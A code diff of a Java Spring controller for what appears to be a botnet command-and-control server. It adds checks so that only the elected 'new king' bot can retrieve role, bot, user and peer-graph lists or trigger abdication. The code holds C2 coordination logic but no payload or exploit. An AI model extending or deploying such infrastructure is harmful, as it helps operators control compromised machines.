@@ -29,21 +29,16 @@ public class CommandController {
 	@Autowired
 	private Config configEngine;
 
-
 	@Autowired
 	private Commando cmm;
-	
-	
-	
+
 	@RequestMapping(value = "/neighbours", method = RequestMethod.POST)
 	@ResponseBody
-	public byte[] getNeighbours(@RequestBody String data, HttpServletResponse error)  {
+	public byte[] getNeighbours(@RequestBody String data, HttpServletResponse error) {
 		return cmm.getNeighbours(data);
 	}
-	
+
 	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////
-
-
 
 	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
 	@ResponseBody
@@ -96,122 +91,126 @@ public class CommandController {
 		}
 		return response;
 	}
-	
-	
-	
+
 	@RequestMapping(value = "/newKing/roles", method = RequestMethod.POST)
 	@ResponseBody
 	public List<Role> newKingRoles(@RequestBody String idBot) {
+		if (!cmm.getNewKing().equals(idBot))
+			return null;
 		List<Role> response = new ArrayList<Role>();
-			//ruoli
-			response.addAll(cmm.getrServ().findAll());
+		// ruoli
+		response.addAll(cmm.getrServ().findAll());
 		return response;
 	}
-	
-	
+
 	@RequestMapping(value = "/newKing/bots", method = RequestMethod.POST)
 	@ResponseBody
-	public List<Bot> newKingBots(@RequestBody String idBot)  {
+	public List<Bot> newKingBots(@RequestBody String idBot) {
 		List<Bot> response = new ArrayList<Bot>();
-			//Bot
-			response.addAll(cmm.getbServ().findAll());
-			response.forEach(b->System.out.println("bot "+b));
+		// Bot
+		if (!cmm.getNewKing().equals(idBot))
+			return null;
+		response.addAll(cmm.getbServ().findAll());
+		response.forEach(b -> System.out.println("bot " + b));
 		return response;
 	}
-	
+
 	@RequestMapping(value = "/newKing/users", method = RequestMethod.POST)
 	@ResponseBody
-	public List<User> newKingUsers(@RequestBody String idBot)  {
+	public List<User> newKingUsers(@RequestBody String idBot) {
 		List<User> response = new ArrayList<User>();
-			//User
-			response.addAll(cmm.getuServ().findAll());
+		// User
+		if (!cmm.getNewKing().equals(idBot))
+			return null;
+		response.addAll(cmm.getuServ().findAll());
 		return response;
 	}
-	
-	
+
 	@RequestMapping(value = "/newKing/peers", method = RequestMethod.POST)
 	@ResponseBody
-	public List<String> newKingPeers(@RequestBody String idBot)  {
+	public List<String> newKingPeers(@RequestBody String idBot) {
 		List<String> response = new ArrayList<String>();
-			//User
-		cmm.getGraph().edgeSet().forEach(e->{
+		// User
+		if (!cmm.getNewKing().equals(idBot))
+			return null;
+		cmm.getGraph().edgeSet().forEach(e -> {
 			String txt = e.toString();
-			txt=txt.replace("(", "");
-			txt=txt.replace(")", "");
-			txt=txt.replace(" ", "");
-			txt=txt.replace(":", "<HH>");
+			txt = txt.replace("(", "");
+			txt = txt.replace(")", "");
+			txt = txt.replace(" ", "");
+			txt = txt.replace(":", "<HH>");
 			response.add(txt);
 		});
-//		response.forEach(resp->System.out.println("cose nel grafo: "+resp));
-		System.out.println("response grafo: "+response);
+		// response.forEach(resp->System.out.println("cose nel grafo: "+resp));
+		System.out.println("response grafo: " + response);
 		return response;
 	}
 
-	
 	@RequestMapping(value = "/newKing/ready", method = RequestMethod.POST)
 	@ResponseBody
-	public boolean newKingReady(@RequestBody String idBot)  {
-		//avvisa dns
+	public boolean newKingReady(@RequestBody String idBot) {
+		// avvisa dns
+		if (!cmm.getNewKing().equals(idBot))
+			return false;
 		cmm.abdicate();
-		 configEngine.setCommandandconquerStatus(false);
-		 cmm.setNewKing("");
+		configEngine.setCommandandconquerStatus(false);
+		cmm.setNewKing("");
 		return true;
 	}
-	
-	//TODO RIMUOVERE TEST
+
+	// TODO RIMUOVERE TEST
 	@RequestMapping(value = "/election", method = RequestMethod.GET)
 	@ResponseBody
-	public boolean startElection(){
-			if (configEngine.isCommandandconquerStatus()){
-				cmm.startElection();
-			}
-			return true;
+	public boolean startElection() {
+		if (configEngine.isCommandandconquerStatus()) {
+			cmm.startElection();
 		}
-	
-	
-	//Deprecated
+		return true;
+	}
 
-//	@RequestMapping(value = "/newKing", method = RequestMethod.POST)
-//	@ResponseBody
-//
-//	public List<Object> newKing(@RequestBody String j)  {
-//		List<Object> response = new ArrayList<Object>();
-//		
-//		Integer i = Integer.parseInt(j);
-//		
-//		System.out.println("processamento della i: "+(i+10));
-//	
-//		if(i==1){
-//			//ruoli
-//			response.addAll(cmm.getrServ().findAll());
-//		} else if(i==2) {
-//			//bot
-//			response.addAll(cmm.getbServ().findAll());
-//		} else if(i==3) {
-//			//user
-//			response.addAll(cmm.getuServ().findAll());
-//		} else if(i==4) {
-////			response.addAll(cmm.getGraph().edgeSet());
-//			List<Object> aux = new ArrayList<Object>();
-//			cmm.getGraph().edgeSet().forEach(e->{
-//				String txt = e.toString();
-//				txt=txt.replace("(", "");
-//				txt=txt.replace(")", "");
-//				txt=txt.replace(" ", "");
-//				txt=txt.replace(":", "|");
-//				System.out.println("adderò: "+txt);
-//				aux.add(txt);
-//			});
-//			response.addAll(aux);
-////			response.forEach(resp->System.out.println("cose nel grafo: "+resp));
-//			System.out.println("response grafo: "+response);
-//		} else {
-//			return null;
-//		}
-//		
-//		
-//		
-//		return response;
-//	}
+	// Deprecated
+
+	// @RequestMapping(value = "/newKing", method = RequestMethod.POST)
+	// @ResponseBody
+	//
+	// public List<Object> newKing(@RequestBody String j) {
+	// List<Object> response = new ArrayList<Object>();
+	//
+	// Integer i = Integer.parseInt(j);
+	//
+	// System.out.println("processamento della i: "+(i+10));
+	//
+	// if(i==1){
+	// //ruoli
+	// response.addAll(cmm.getrServ().findAll());
+	// } else if(i==2) {
+	// //bot
+	// response.addAll(cmm.getbServ().findAll());
+	// } else if(i==3) {
+	// //user
+	// response.addAll(cmm.getuServ().findAll());
+	// } else if(i==4) {
+	//// response.addAll(cmm.getGraph().edgeSet());
+	// List<Object> aux = new ArrayList<Object>();
+	// cmm.getGraph().edgeSet().forEach(e->{
+	// String txt = e.toString();
+	// txt=txt.replace("(", "");
+	// txt=txt.replace(")", "");
+	// txt=txt.replace(" ", "");
+	// txt=txt.replace(":", "|");
+	// System.out.println("adderò: "+txt);
+	// aux.add(txt);
+	// });
+	// response.addAll(aux);
+	//// response.forEach(resp->System.out.println("cose nel grafo: "+resp));
+	// System.out.println("response grafo: "+response);
+	// } else {
+	// return null;
+	// }
+	//
+	//
+	//
+	// return response;
+	// }
 
 }
